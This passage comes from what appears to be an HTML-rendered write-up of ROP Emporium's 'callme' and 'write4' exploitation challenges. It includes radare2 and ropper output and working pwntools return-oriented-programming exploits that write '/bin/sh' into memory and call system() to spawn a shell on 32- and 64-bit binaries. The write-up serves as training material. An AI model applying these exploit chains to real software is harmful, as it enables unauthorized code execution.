</span> <span class="mi">17</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span> <span class="c1"># Load 3 into rdx
</span> <span class="mi">18</span>
 <span class="mi">19</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">callme_one_addr</span> <span class="c1"># The 'ret; ' instruction returns into callme_one()
</span> <span class="mi">20</span>
 <span class="mi">21</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_three_addr</span> <span class="c1"># We repeat the same thing to load the three values
</span> <span class="mi">22</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>
 <span class="mi">23</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span>
 <span class="mi">24</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span>
 <span class="mi">25</span>
 <span class="mi">26</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">callme_two_addr</span> <span class="c1"># And so on..
</span> <span class="mi">27</span>
 <span class="mi">28</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_three_addr</span>
 <span class="mi">29</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>
 <span class="mi">30</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span>
 <span class="mi">31</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span>
 <span class="mi">32</span>
 <span class="mi">33</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">callme_three_addr</span>
 <span class="mi">34</span>
 <span class="mi">35</span> <span class="n">sh</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
 <span class="mi">36</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
 <span class="mi">37</span> <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="mi">38</span>
 <span class="mi">39</span> <span class="k">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
</code></pre></div></div>

<p>Running the exploit.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/callme/64callme# <span class="nb">chmod</span> +x exploit.py <span class="o">&amp;&amp;</span> ./exploit.py
ROPE<span class="o">{</span>a_placeholder_32byte_flag!<span class="o">}</span>
</code></pre></div></div>

<h1 id="write4">write4</h1>

<p>The challenge description tells us that this time, the string ‚Äú/bin/cat flag.txt‚Äù doesn‚Äôt actually exist anywhere in the binary. It hints at the fact that we have to write the string ourselves somewhere into the binary first, in order to be able to pass it to <code class="highlighter-rouge">system()</code>. It also tells us we need a gadget of the form <code class="highlighter-rouge">mov [reg1], reg2</code> to move a value stored in <code class="highlighter-rouge">reg2</code> to a memory address stored in <code class="highlighter-rouge">reg1</code>.</p>

<p>I took a little bit of a different route. Instead of writing the string ‚Äú/bin/cat flag.txt‚Äù, which would be 17 bytes, I instead chose to write the string ‚Äú/bin/sh ‚Äú, which is 8 bytes. This gets me a shell. The trailing space at the end just after ‚Äú/sh ‚Äú is important since it aligns the string to 4 and 8 bytes (for the 32-bit and 64-bit versions respectively). If we don‚Äôt align it correctly, the exploit might not work as intended.</p>

<p>Enough with the description, lets get down to business.</p>

<h3 id="32-bit-3">32-bit</h3>

<p>Running checksec.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/write4/32write4# checksec write432
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/Documents/ropemporium/write4/32write4/write432'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</code></pre></div></div>

<p>As the challenge tells us, we won‚Äôt find the string ‚Äú/bin/cat flag.txt‚Äù in the binary, but we may as well check.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/write4/32write4# rabin2 <span class="nt">-z</span> write432
<span class="o">[</span>Strings]
Num Paddr      Vaddr      Len Size Section  Type  String
000 0x00000700 0x08048700  22  23 <span class="o">(</span>.rodata<span class="o">)</span> ascii write4 by ROP Emporium
001 0x00000717 0x08048717   7   8 <span class="o">(</span>.rodata<span class="o">)</span> ascii 32bits<span class="se">\n</span>
002 0x0000071f 0x0804871f   8   9 <span class="o">(</span>.rodata<span class="o">)</span> ascii <span class="se">\n</span>Exiting
003 0x00000728 0x08048728  40  41 <span class="o">(</span>.rodata<span class="o">)</span> ascii Go ahead and give me the string already!
004 0x00000754 0x08048754   7   8 <span class="o">(</span>.rodata<span class="o">)</span> ascii /bin/ls
</code></pre></div></div>

<p>Okay, let‚Äôs analyze the binary in radare2.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/write4/32write4# r2 write432
<span class="o">[</span>0x08048480]&gt; aaaa
<span class="o">[</span>x] Analyze all flags starting with sym. and entry0 <span class="o">(</span>aa<span class="o">)</span>
<span class="o">[</span>x] Analyze <span class="k">function </span>calls <span class="o">(</span>aac<span class="o">)</span>
<span class="o">[</span>x] Analyze len bytes of instructions <span class="k">for </span>references <span class="o">(</span>aar<span class="o">)</span>
<span class="o">[</span>x] Constructing a <span class="k">function </span>name <span class="k">for </span>fcn.<span class="k">*</span> and sym.func.<span class="k">*</span> functions <span class="o">(</span>aan<span class="o">)</span>
<span class="o">[</span>x] Enable constraint types analysis <span class="k">for </span>variables
<span class="o">[</span>0x08048480]&gt; afl
0x080483c0    3 35           sym._init
0x08048400    1 6            sym.imp.printf
0x08048410    1 6            sym.imp.fgets
0x08048420    1 6            sym.imp.puts
0x08048430    1 6            sym.imp.system
0x08048440    1 6            sym.imp.__libc_start_main
0x08048450    1 6            sym.imp.setvbuf
0x08048460    1 6            sym.imp.memset
0x08048470    1 6            sub.__gmon_start_8048470
0x08048480    1 33           entry0
0x080484b0    1 4            sym.__x86.get_pc_thunk.bx
0x080484c0    4 43           sym.deregister_tm_clones
0x080484f0    4 53           sym.register_tm_clones
0x08048530    3 30           sym.__do_global_dtors_aux
0x08048550    4 43   -&gt; 40   entry.init0
0x0804857b    1 123          sym.main
0x080485f6    1 86           sym.pwnme
0x0804864c    1 25           sym.usefulFunction
0x08048680    4 93           sym.__libc_csu_init
0x080486e0    1 2            sym.__libc_csu_fini
0x080486e4    1 20           sym._fini
<span class="o">[</span>0x08048480]&gt; s sym.usefulFunction
<span class="o">[</span>0x0804864c]&gt; pdf
/ <span class="o">(</span>fcn<span class="o">)</span> sym.usefulFunction 25
|   sym.usefulFunction <span class="o">()</span><span class="p">;</span>
|           0x0804864c      55             push ebp
|           0x0804864d      89e5           mov ebp, esp
|           0x0804864f      83ec08         sub esp, 8
|           0x08048652      83ec0c         sub esp, 0xc
|           0x08048655      6854870408     push str.bin_ls             <span class="p">;</span> 0x8048754 <span class="p">;</span> <span class="s2">"/bin/ls"</span>
|           0x0804865a      e8d1fdffff     call sym.imp.system         <span class="p">;</span> int system<span class="o">(</span>const char <span class="k">*</span>string<span class="o">)</span>
|           0x0804865f      83c410         add esp, 0x10
|           0x08048662      90             nop
|           0x08048663      c9             leave
<span class="se">\ </span>          0x08048664      c3             ret
<span class="o">[</span>0x0804864c]&gt;

</code></pre></div></div>

<p>I just assume <code class="highlighter-rouge">pwnme()</code> has the usual buffer overflow. <code class="highlighter-rouge">usefulFunction</code> doesn‚Äôt seem so useful at all, but it does hint at the fact that we need to call <code class="highlighter-rouge">system()</code> later. Cool.</p>

<p>Now we need to find a spot in memory that we can write to.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>0x08048480]&gt; iS
<span class="o">[</span>Sections]
Nm Paddr       Size Vaddr      Memsz Perms Name
00 0x00000000     0 0x00000000     0 <span class="nt">----</span>
...
19 0x00000f08     4 0x08049f08     4 <span class="nt">-rw-</span> .init_array
20 0x00000f0c     4 0x08049f0c     4 <span class="nt">-rw-</span> .fini_array
21 0x00000f10     4 0x08049f10     4 <span class="nt">-rw-</span> .jcr
22 0x00000f14   232 0x08049f14   232 <span class="nt">-rw-</span> .dynamic
23 0x00000ffc     4 0x08049ffc     4 <span class="nt">-rw-</span> .got
24 0x00001000    40 0x0804a000    40 <span class="nt">-rw-</span> .got.plt
25 0x00001028     8 0x0804a028     8 <span class="nt">-rw-</span> .data
26 0x00001030     0 0x0804a040    44 <span class="nt">-rw-</span> .bss
...

<span class="o">[</span>0x08048480]&gt;
</code></pre></div></div>

<p>Seeing as our string ‚Äú/bin/sh ‚Äú is 8 bytes in length, I chose the .data section to write the string to as it has the perfect size.</p>

<p>Now, let‚Äôs use ropper to find some gadgets that we might be able to use.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/write4/32write4# ropper <span class="nt">-f</span> write432
<span class="o">[</span>INFO] Load gadgets from cache
<span class="o">[</span>LOAD] loading... 100%
<span class="o">[</span>LOAD] removing double gadgets... 100%



Gadgets
<span class="o">=======</span>


...
0x08048670: mov dword ptr <span class="o">[</span>edi], ebp<span class="p">;</span> ret<span class="p">;</span>
...
0x080486da: pop edi<span class="p">;</span> pop ebp<span class="p">;</span> ret<span class="p">;</span>
...
</code></pre></div></div>

<p>It took me a little bit to find two gadgets that matched the registers, but I ended up finding these <code class="highlighter-rouge">mov</code> and <code class="highlighter-rouge">pop</code> gadgets that would work perfectly.</p>

<p>Now, let‚Äôs try to build the ROP chain. I like to do this on paper first (which I‚Äôve already done). I will show the ROP chain then explain it. The stack goes from top to bottom, with lower memory addresses on the top and higher memory addresses on the bottom.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|  <span class="c"># Write the "/bin" string to the .data section</span>
|
|  <span class="o">{</span>AAAAAAAAA_buffer_overflow_str<span class="o">}</span>
|  <span class="o">{</span>pop_edi_pop_ebp_ret_gadget_addr<span class="o">}</span>
|  <span class="o">{</span>addr_of_.data_section_in_memory<span class="o">}</span>
|  <span class="o">{</span>the_/bin_string<span class="o">}</span>
|  <span class="o">{</span>mov_[edi]_ebp_ret_gadget_addr<span class="o">}</span>
|  
|  <span class="c"># Now repeat the same thing for the "/sh " string</span>
|
|  <span class="o">{</span>pop_edi_pop_ebp_ret_gadget_addr<span class="o">}</span>
|  <span class="o">{</span>addr_of_.data_section_in_memory_plus_0x4<span class="o">}</span>
|  <span class="o">{</span>the_/sh_string<span class="o">}</span>
|  <span class="o">{</span>mov_[edi]_ebp_ret_gadget_addr<span class="o">}</span>
|
|  <span class="c"># Now, call system()</span>
|
|  <span class="o">{</span>addr_of_system<span class="o">}</span>
|  <span class="o">{</span>return_addr_of_system<span class="o">}</span>
|  <span class="o">{</span>addr_of_.data_section_in_memory<span class="o">}</span>
</code></pre></div></div>

<p>Explanation for the above ROP chain:</p>

<ol>
  <li>First, we overflow the buffer and change the return address to the <code class="highlighter-rouge">pop edi; pop ebp; ret;</code> gadget</li>
  <li>The next value on the stack must be the address to the .data section. This is popped into EDI.</li>
  <li>The next value on the stack will be the string ‚Äú/bin‚Äù. This is popped into EBP.</li>
  <li>The pop edi gadget returns into the <code class="highlighter-rouge">mov [edi], ebp; ret;</code> gadget, which moves the string stored in EBP to the memory location stored in EDI.</li>
  <li>We repeat the exact same thing for the remainder of the string ‚Äú/sh ‚Äú, except this time we have to ensure to add 0x4 to the address of the .data section so that we don‚Äôt overwrite the already written string ‚Äú/bin‚Äù.</li>
  <li>The final <code class="highlighter-rouge">ret</code>; in the mov gadget will then return into <code class="highlighter-rouge">system()</code>, and we set up the stack so that the argument to system is the address to the .data section where our ‚Äú/bin/sh ‚Äú string is stored.</li>
</ol>

<p>Using the above information, we write the exploit script.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./write432"</span><span class="p">)</span>

<span class="c1"># Gadgets
</span><span class="n">pop_two_addr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080486da</span><span class="p">)</span> <span class="c1"># pop edi; pop ebp; ret;
</span><span class="n">mov_addr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048670</span><span class="p">)</span> <span class="c1"># mov [edi], ebp;
</span>
<span class="n">data_addr</span> <span class="o">=</span> <span class="mh">0x0804a028</span> <span class="c1"># memory address of the .data section
</span><span class="n">system_addr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048430</span><span class="p">)</span> <span class="c1"># address to system()
</span>
<span class="s">'''
Note that we have to write the string "/bin/sh " 4 bytes at a time since this
is a 32-bit binary. In the 64-bit version, we can write the whole string in one
go as an 8 byte write.
'''</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">44</span> <span class="c1"># Overflow the buffer (offset found using gdb gef, refer to previous challenges)
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_two_addr</span> <span class="c1"># Jump to the 'pop edi; pop ebp; ret;' gadget
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_addr</span><span class="p">)</span> <span class="c1"># Pop this into edi
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"/bin"</span> <span class="c1"># Pop this into ebp
</span>
<span class="c1"># mov [edi], ebp will move "/bin" into the memory location stored in edi
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_addr</span>

<span class="s">'''
Now repeat the same thing with the remaining of the string, taking note of
the fact that you have to remember to do two things:

1. Add four bytes to the address of the .data section, otherwise you will
   overwrite the "/bin" string with "/sh "

2. Ensure there is a trailing space in "/sh ". This is important as otherwise
   it will probably get replaced by a null byte (in order to make it 4 bytes in
   size). The null byte might cause the exploit to not work as intended.
'''</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_two_addr</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_addr</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"/sh "</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_addr</span>

<span class="s">'''
Right now, the .data section contains the string "/bin/sh ". We can now call
system just like we did for the 'split32' challenge by setting up the stack
such that the mov gadget from above returns to system()
'''</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">system_addr</span> <span class="c1"># Return to the system() function from the mov gadget
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="c1"># Return address for system doesn't matter
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_addr</span><span class="p">)</span> <span class="c1"># Location in memory of "/bin/sh "
</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Running the exploit.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/write4/32write4# <span class="nb">chmod</span> +x exploit.py <span class="o">&amp;&amp;</span> ./exploit.py
<span class="nv">$ </span><span class="nb">ls
</span>core  exploit.py  flag.txt  payload  write432
<span class="nv">$ </span><span class="nb">cat </span>flag.txt
ROPE<span class="o">{</span>a_placeholder_32byte_flag!<span class="o">}</span>
<span class="nv">$ </span> 
</code></pre></div></div>

<h3 id="64-bit-3">64-bit</h3>

<p>The way the challenges have been going, we know that we have to do the exact same thing that we did in the 32-bit version with some slight changes. First, we have to change the ROP chain to ensure it confines with what a 64-bit ROP chain should look like. Secondly, we have to change the way we call <code class="highlighter-rouge">system()</code> since we have to pop the argument (the address to the .data section) into RDI first.</p>

<p>We can also write the whole ‚Äú/bin/sh ‚Äú string in one go now, since on a 64-bit system, the registers can store 8 bytes at a time.</p>

<p>I‚Äôve commented my code to explain the exploit as much as I could. If you are still confused, I suggest looking at the explanation for the 32-bit version above. It is the same thing with some slight changes.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./write4"</span><span class="p">)</span>

<span class="c1"># Gadgets
</span><span class="n">mov_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400820</span><span class="p">)</span> <span class="c1"># move [r14], r15
</span><span class="n">pop_two_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400890</span><span class="p">)</span> <span class="c1"># pop r14; pop r15; ret;
</span><span class="n">pop_rdi_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400893</span><span class="p">)</span> <span class="c1"># pop rdi; ret;
</span>
<span class="n">data_addr</span> <span class="o">=</span> <span class="mh">0x00601050</span> <span class="c1"># .data section address
</span><span class="n">system_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004005e0</span><span class="p">)</span> <span class="c1"># system() address
</span>
<span class="s">'''
When putting the string "/bin/sh " into the register, the trailing
space is important. Otherwise a NULL byte gets placed there instead,
which can cause the exploit to not work as intended
'''</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">40</span> <span class="c1"># Overflow the buffer (offset found using gdb gef, refer to previous challenges)
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_two_addr</span> <span class="c1"># jump to the 'pop r14; pop r15; ret;' gadget
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_addr</span><span class="p">)</span> <span class="c1"># pop the address of the data section into r14
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"/bin/sh "</span> <span class="c1"># pop the string "/bin/sh " into r15
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_addr</span> <span class="c1"># jump to the 'mov [r14], r15' gadget
</span>
<span class="s">'''
At this stage, the data section will contain the string "/bin/sh " since
the mov instruction above just moved the string from r15 into the memory
address stored inside r14
'''</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi_addr</span> <span class="c1"># return to the 'pop rdi; ret;' gadget from the mov instruction
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_addr</span><span class="p">)</span> <span class="c1"># pop the address of the string "/bin/sh " into rdi
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">system_addr</span> <span class="c1"># return from the gadget into system
</span>
<span class="c1"># -- System's return address doesn't matter --
</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>

<p>Running the exploit.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/write4/64write4# <span class="nb">chmod</span> +x exploit.py <span class="o">&amp;&amp;</span> ./exploit.py
<span class="nv">$ </span><span class="nb">ls
</span>exploit.py  flag.txt  write4
<span class="nv">$ </span><span class="nb">cat </span>flag.txt
ROPE<span class="o">{</span>a_placeholder_32byte_flag!<span class="o">}</span>
<span class="nv">$ </span> 
</code></pre></div></div>
:ET